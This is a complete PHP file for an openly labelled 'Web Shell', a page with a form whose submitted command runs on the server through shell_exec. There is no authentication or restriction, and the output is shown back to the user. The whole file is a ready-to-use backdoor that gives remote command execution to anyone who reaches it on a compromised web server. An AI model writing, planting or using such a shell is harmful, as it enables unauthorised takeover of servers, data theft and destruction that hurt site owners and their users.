<?php

function getClearedValue($value)
{
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

$command = '';
$result = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $command && !($result = shell_exec($command)) && $result = 'No result';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
    <title>Web Shell</title>
    <style>
        .container {
            width: 850px;
        }
        h2 {
            color: #212121;
        }
        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #212121;
            color: #08ec08;
        }
    </style>

</head>
<body>
    <div class="container">
        <div class="pb-2 mt-4 mb-2">
            <h1>Web Shell</h1>
            <h2>Execute a command</h2>
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd">
                    <strong>Command</strong>
                </label>
                <input type="text"
                       class="form-control"
                       name="cmd"
                       placeholder="Type the command"
                       id="cmd"
                       value="<?= getClearedValue($command) ?>"
                       required
                >
            </div>
            <button
                type="submit"
                class="btn btn-primary"
            >
                Execute
            </button>
        </form>

        <div class="pb-2 mt-4 mb-2">
            <h2>Output</h2>
        </div>

        <pre>
<?= getClearedValue($result) ?>
        </pre>
    </div>
</body>
</html>
